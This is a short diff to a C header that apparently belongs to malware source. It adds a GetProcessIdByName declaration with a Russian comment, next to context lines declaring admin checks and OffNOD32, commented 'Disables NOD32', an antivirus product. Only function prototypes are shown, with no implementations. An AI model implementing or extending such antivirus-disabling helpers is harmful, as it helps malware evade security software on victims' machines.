@@ -438,6 +438,8 @@ HANDLE TryCreateSingleInstance(const char* MutexPrefix);
 BOOL IsUserAdmin();
 bool IsUserLocalSystem();
 
+//возвращает PID процесса по его имени
+DWORD GetProcessIdByName(PCHAR ProcessName);
 //Отключает НОД32
 VOID OffNOD32();
 
